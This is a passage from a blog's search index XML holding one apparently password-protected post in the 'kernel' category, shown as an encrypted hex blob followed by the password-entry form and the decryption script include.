2158d457b8aaaaf477cde7d2221c875897ad130ee0d062e1e5c34776e334563a9efd0a042d67133d432ad61806397f0a9b727906e28deb94891d7ca296aa624df5e6d029c21afab94512dc36600e59691b320fb8dca05d7511549a5dfd884f86b2f17e8179851d906f4d90ab50b222ac8f0ad5452c98f10855ec8dbbab8ea152461d488421277dd91e997324a0e1d22bee4c053d50c2784365f5798005ea93e1be3ed6a6491a1ead4718d44de4c4016e18b63f3d6fb1f955619584cda671b97d9f5c5c846c63f3b09b294879bf370712f8eeef98468dbcbe25aa4c12355e4d8fcc081a16a1ae96cf9628b33172c1161418b8d5df35390356d7dab92506f93901f74bff9b613b33f1d2bc49c841b3d3d3f6c830280a1bdb31a9091660b20c08361aa0a2d79c7fcbc8c953af53055be7c7ce7b23dad8a5dcfba1ec169b29f1ed1a673d2f0b863b68f3a74b77a2fcc0b0bc75d854ce2983c27e35682d34002fc0c9b0c8f8290d07579c0f115c0244cf7411bb71e8f6cb786f5b2a1e880c40e9ae41d7a9e9a17489c3e19d411f3b7f6137fd93da612b477ca45b807c602fd3026b9215f0d1e396b7b907de0587b4983d613e101f900387af8cdd1f44ad60bb70b0cf45443671263227ff7b401cf02ae77910c1ee2075fe7e4341a8278eddfcb53fb93b5da408c6f2469ee9babbb97d02a67318161d73a1c4e8173e711ddef0b373f98af52583476c4a37bf5fba48915c286cadfa003e2fdb3a88748cda795246657613072ea68aa90bd1d55f3351a3cff275447df5bb9d668f3dde87de0c93e7f366fb0267ee1918cc8233f44bdbebbbe37ced757bf9aaca97da323541db44e8aa6ee3738b4ecb0edd86354f2968570adf2782ad8c18bd5e99b0007db01cb7b7b5ba04da28c3a751a4e53d328a1e47c23f9ca31d4b9f1f35d247cbb5ec14dbd1a060e3a0aa188e11ea92fa0626a5a77993aefa682030dd8afe4595a20601274714e27e81cd1bb1a5761df44e0b54124249399af4ac8349b39594979eb782242888d0bd81209a00db5680b740e5e6ad37bd020b304b4aba62b2ccd50121e729f7307a03669f90d129b332d49773b061fad1b4023f40092d5308848864c38eeb80c867bb52d486dd9f259ceaf26a6d88852a89a68af7582823956df6bfc6285f814aefa6e6024cb32a4524c83fc7b21bf8cfc7ac77ec5f45e0ab36fdebd5d86e38f75090eceee7becedc19f9c22f9d7bd7e4fd5f8091234085629285c2f2d4910ec81f6659e93ddf02d4999acdbca31c0d8464dda805f0665a2ff1eae47213e80f02c071635712e7548e51dda508b0a6ca6a510702f4373dc55bb5c5694905b7a082672ffb7f40e8e5cc7e329067fe256840f31af881e9d1c2492ca5957b1cf39872ba6693b080350341279263babc024386ac495f82b504cea756f558dbeb35c87e81f67a5ba197828677b651db4e89490054f3d696131fcc4a8f6528e0629c818f5f33c93f0f0c4a6d1cca8ec7a7532fbf7c5800b11926562e19f7beb888a45beaa36ebd8eba8d7f0bfba5f77578afbc6f41b6a3849c635c9a424113663a56cec7c54721c18ee34e709215ec15f64df1ab11208c6b97ddafc6ef616c1abf2183dbbbdb5506ec7b1962b17934a07fc7c6fb48fd190680a92a0a57e0e32d099bbbe8f3cc979339297678ab6023dd0453c28e84e3e64048adb1d500d6ea2da575cefadc0b424bd627e6bbac66cedbaed192bf13d405696c1d9696fb88e76342f47b90a2f6890146901e94cc0e5b1a4d05fa1efcdfb5e8108cf8a669d75feb02d571c2b2950589de643ed72efee974fa9db14fd40bc974989c264360c96efe9184644dc1fb96016d8a585f246f37c2deb73eb8ac0865</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
</search>
